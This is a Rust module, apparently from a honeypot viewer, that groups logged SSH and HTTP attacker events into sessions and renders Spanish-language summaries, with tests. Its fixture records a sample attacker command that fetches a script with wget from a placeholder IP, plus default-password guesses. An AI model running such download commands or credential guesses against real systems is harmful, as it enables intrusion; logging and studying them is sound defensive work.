//! Reads the JSONL log and turns it into a readable summary.

use crate::log::parse_flat_object;
use std::fs;
use std::path::Path;

/// One credential the attacker tried.
#[derive(Debug, Clone)]
pub struct Attempt {
    pub user: String,
    pub password: String,
    pub result: String,
}

/// One HTTP request the attacker made.
#[derive(Debug, Clone)]
pub struct Request {
    pub method: String,
    pub path: String,
    pub user: String,
    pub password: String,
    pub status: String,
}

/// Everything recorded about one session.
#[derive(Debug, Clone, Default)]
pub struct Session {
    pub id: String,
    pub service: String,
    pub peer: String,
    pub events: usize,
    pub attempts: Vec<Attempt>,
    pub accepted: bool,
    pub commands: Vec<String>,
    pub downloads: Vec<String>,
    pub requests: Vec<Request>,
    pub duration: Option<String>,
}

/// Reads the log and groups the events by session.
pub fn read_sessions(path: &Path) -> Result<Vec<Session>, String> {
    let content =
        fs::read_to_string(path).map_err(|e| format!("no se pudo leer {}: {e}", path.display()))?;

    let mut sessions: Vec<Session> = Vec::new();
    for line in content.lines() {
        if line.trim().is_empty() {
            continue;
        }
        let fields = match parse_flat_object(line) {
            Some(fields) => fields,
            None => continue,
        };
        let id = field(&fields, "session").unwrap_or("s-?");
        let index = match sessions.iter().position(|session| session.id == id) {
            Some(index) => index,
            None => {
                sessions.push(Session {
                    id: id.to_string(),
                    ..Session::default()
                });
                sessions.len() - 1
            }
        };
        apply_event(&mut sessions[index], &fields);
    }

    Ok(sessions)
}

fn apply_event(session: &mut Session, fields: &[(String, String)]) {
    session.events += 1;
    if let Some(service) = field(fields, "service") {
        session.service = service.to_string();
    }
    if let Some(peer) = field(fields, "peer") {
        session.peer = peer.to_string();
    }

    match field(fields, "event").unwrap_or_default() {
        "login_attempt" => session.attempts.push(Attempt {
            user: field(fields, "user").unwrap_or_default().to_string(),
            password: field(fields, "password").unwrap_or_default().to_string(),
            result: field(fields, "result").unwrap_or_default().to_string(),
        }),
        "login_accepted" => session.accepted = true,
        "command" => session
            .commands
            .push(field(fields, "command").unwrap_or_default().to_string()),
        "download_attempt" => session
            .downloads
            .push(field(fields, "url").unwrap_or_default().to_string()),
        "http_get" | "http_post" => session.requests.push(Request {
            method: field(fields, "method").unwrap_or_default().to_string(),
            path: field(fields, "path").unwrap_or_default().to_string(),
            user: field(fields, "user").unwrap_or_default().to_string(),
            password: field(fields, "password").unwrap_or_default().to_string(),
            status: field(fields, "status").unwrap_or_default().to_string(),
        }),
        "session_end" => {
            session.duration = Some(field(fields, "duration").unwrap_or_default().to_string())
        }
        _ => {}
    }

    if session
        .attempts
        .iter()
        .any(|attempt| attempt.result == "accepted")
    {
        session.accepted = true;
    }
}

fn field<'a>(fields: &'a [(String, String)], key: &str) -> Option<&'a str> {
    fields
        .iter()
        .find(|(name, _)| name == key)
        .map(|(_, value)| value.as_str())
}

/// Renders the sessions for a human reader.
pub fn render(sessions: &[Session]) -> String {
    if sessions.is_empty() {
        return "El registro está vacío: todavía no entró nadie.\n".to_string();
    }

    let mut out = format!("Registro: {} sesión(es)\n\n", sessions.len());
    for (index, session) in sessions.iter().enumerate() {
        out.push_str(&format!(
            "Sesión {} · {} · {} · {} eventos",
            index + 1,
            if session.service.is_empty() {
                "?"
            } else {
                &session.service
            },
            if session.peer.is_empty() {
                "?"
            } else {
                &session.peer
            },
            session.events
        ));
        if let Some(duration) = &session.duration {
            out.push_str(&format!(" · {duration}"));
        }
        out.push('\n');

        if !session.attempts.is_empty() {
            let attempts: Vec<String> = session
                .attempts
                .iter()
                .map(|attempt| {
                    format!("{}/{} ({})", attempt.user, attempt.password, attempt.result)
                })
                .collect();
            out.push_str(&format!("  Credenciales: {}\n", attempts.join(" · ")));
        }

        if !session.requests.is_empty() {
            let requests: Vec<String> = session
                .requests
                .iter()
                .map(|request| {
                    let mut line =
                        format!("{} {} ({})", request.method, request.path, request.status);
                    if !request.user.is_empty() {
                        line.push_str(&format!(
                            " usuario={} contraseña={}",
                            request.user, request.password
                        ));
                    }
                    line
                })
                .collect();
            out.push_str(&format!("  Peticiones: {}\n", requests.join(" · ")));
        }

        if !session.commands.is_empty() {
            out.push_str(&format!(
                "  Órdenes ({}): {}\n",
                session.commands.len(),
                session.commands.join("; ")
            ));
        }

        if !session.downloads.is_empty() {
            out.push_str(&format!("  Descargas: {}\n", session.downloads.join(" · ")));
        }

        out.push('\n');
    }
    out
}

/// Renders the sessions as JSON.
pub fn to_json(sessions: &[Session]) -> String {
    let items: Vec<String> = sessions
        .iter()
        .map(|session| {
            let attempts: Vec<String> = session
                .attempts
                .iter()
                .map(|attempt| {
                    format!(
                        "{{\"user\":{},\"password\":{},\"result\":{}}}",
                        crate::log::json_escape(&attempt.user),
                        crate::log::json_escape(&attempt.password),
                        crate::log::json_escape(&attempt.result)
                    )
                })
                .collect();
            let commands: Vec<String> = session
                .commands
                .iter()
                .map(|command| crate::log::json_escape(command))
                .collect();
            let downloads: Vec<String> = session
                .downloads
                .iter()
                .map(|url| crate::log::json_escape(url))
                .collect();
            let requests: Vec<String> = session
                .requests
                .iter()
                .map(|request| {
                    format!(
                        "{{\"method\":{},\"path\":{},\"user\":{},\"password\":{},\"status\":{}}}",
                        crate::log::json_escape(&request.method),
                        crate::log::json_escape(&request.path),
                        crate::log::json_escape(&request.user),
                        crate::log::json_escape(&request.password),
                        crate::log::json_escape(&request.status)
                    )
                })
                .collect();
            format!(
                "{{\"session\":{},\"service\":{},\"peer\":{},\"events\":{},\"accepted\":{},\"duration\":{},\"attempts\":[{}],\"commands\":[{}],\"downloads\":[{}],\"requests\":[{}]}}",
                crate::log::json_escape(&session.id),
                crate::log::json_escape(&session.service),
                crate::log::json_escape(&session.peer),
                session.events,
                session.accepted,
                crate::log::json_escape(session.duration.as_deref().unwrap_or_default()),
                attempts.join(","),
                commands.join(","),
                downloads.join(","),
                requests.join(",")
            )
        })
        .collect();
    format!("[{}]", items.join(","))
}

#[cfg(test)]
mod tests {
    use super::*;

    const FIXTURE: &str = concat!(
        r#"{"ts":"2026-11-20T19:40:00Z","service":"ssh","event":"connect","peer":"127.0.0.1:5001","session":"s-1"}"#,
        "\n",
        r#"{"ts":"2026-11-20T19:40:01Z","service":"ssh","event":"login_attempt","peer":"127.0.0.1:5001","session":"s-1","user":"root","password":"123456","result":"denied"}"#,
        "\n",
        r#"{"ts":"2026-11-20T19:40:05Z","service":"ssh","event":"login_accepted","peer":"127.0.0.1:5001","session":"s-1","user":"admin"}"#,
        "\n",
        r#"{"ts":"2026-11-20T19:40:06Z","service":"ssh","event":"command","peer":"127.0.0.1:5001","session":"s-1","command":"uname -a"}"#,
        "\n",
        r#"{"ts":"2026-11-20T19:40:07Z","service":"ssh","event":"download_attempt","peer":"127.0.0.1:5001","session":"s-1","command":"wget http://198.51.100.7/x.sh","url":"http://198.51.100.7/x.sh"}"#,
        "\n",
        r#"{"ts":"2026-11-20T19:40:09Z","service":"ssh","event":"session_end","peer":"127.0.0.1:5001","session":"s-1","duration":"9s"}"#,
        "\n",
        r#"{"ts":"2026-11-20T19:41:00Z","service":"http","event":"http_post","peer":"127.0.0.1:5002","session":"h-1","method":"POST","path":"/login","user":"admin","password":"admin","status":"200"}"#,
        "\n",
    );

    fn write_fixture(name: &str) -> std::path::PathBuf {
        let path = std::env::temp_dir().join(name);
        std::fs::write(&path, FIXTURE).expect("no se pudo escribir el fixture");
        path
    }

    #[test]
    fn groups_events_by_session() {
        let path = write_fixture("honeypot-viewer-test.jsonl");
        let sessions = read_sessions(&path).expect("no se pudo leer el registro");
        assert_eq!(sessions.len(), 2);
        assert_eq!(sessions[0].id, "s-1");
        assert_eq!(sessions[1].id, "h-1");
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn collects_attempts_commands_and_downloads() {
        let path = write_fixture("honeypot-viewer-test-2.jsonl");
        let sessions = read_sessions(&path).expect("no se pudo leer el registro");
        let ssh = &sessions[0];
        assert_eq!(ssh.attempts.len(), 1);
        assert_eq!(ssh.attempts[0].user, "root");
        assert_eq!(ssh.attempts[0].result, "denied");
        assert!(ssh.accepted);
        assert_eq!(ssh.commands, vec!["uname -a".to_string()]);
        assert_eq!(ssh.downloads, vec!["http://198.51.100.7/x.sh".to_string()]);
        assert_eq!(ssh.duration.as_deref(), Some("9s"));
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn collects_http_requests() {
        let path = write_fixture("honeypot-viewer-test-3.jsonl");
        let sessions = read_sessions(&path).expect("no se pudo leer el registro");
        let http = &sessions[1];
        assert_eq!(http.requests.len(), 1);
        assert_eq!(http.requests[0].method, "POST");
        assert_eq!(http.requests[0].user, "admin");
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn renders_a_readable_summary() {
        let path = write_fixture("honeypot-viewer-test-4.jsonl");
        let sessions = read_sessions(&path).expect("no se pudo leer el registro");
        let text = render(&sessions);
        assert!(text.contains("Sesión 1 · ssh"));
        assert!(text.contains("root/123456 (denied)"));
        assert!(text.contains("Órdenes (1): uname -a"));
        assert!(text.contains("Sesión 2 · http"));
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn reports_an_empty_log() {
        let path = std::env::temp_dir().join("honeypot-viewer-empty.jsonl");
        std::fs::write(&path, "").expect("no se pudo escribir el archivo");
        let sessions = read_sessions(&path).expect("no se pudo leer el registro");
        assert!(sessions.is_empty());
        assert!(render(&sessions).contains("vacío"));
        let _ = std::fs::remove_file(path);
    }
}
